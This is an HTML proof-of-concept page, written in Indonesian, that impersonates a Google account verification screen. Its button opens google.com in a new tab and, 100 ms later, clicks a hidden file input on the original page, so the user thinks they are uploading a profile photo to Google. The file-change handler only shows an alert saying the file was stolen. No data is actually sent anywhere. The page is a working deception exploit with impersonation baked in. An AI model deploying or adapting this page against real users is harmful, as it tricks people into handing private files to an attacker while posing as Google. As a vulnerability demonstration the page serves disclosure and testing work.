<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <title>PoC Clickjacking File Picker</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding-top: 50px;
      }
      .btn {
        padding: 15px 25px;
        font-size: 18px;
        cursor: pointer;
        background: #4285f4;
        color: white;
        border: none;
        border-radius: 5px;
        text-decoration: none;
      }
      #fileInput {
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>Verifikasi Akun Google Anda</h1>
    <p>Klik tombol di bawah untuk mengunggah foto profil langsung ke Google.</p>

    <input
      type="file"
      id="fileInput"
      onchange="alert('File berhasil dicuri oleh halaman penyerang!')"
    />

    <a
      href="https://www.google.com"
      target="_blank"
      class="btn"
      id="exploitBtn"
    >
      Klik untuk Upload ke Google
    </a>

    <script>
      document
        .getElementById("exploitBtn")
        .addEventListener("click", function () {
          // Memicu file picker di tab lama (halaman ini)
          // saat browser sedang membuka tab baru.
          setTimeout(function () {
            document.getElementById("fileInput").click();
          }, 100);
        });
    </script>
  </body>
</html>
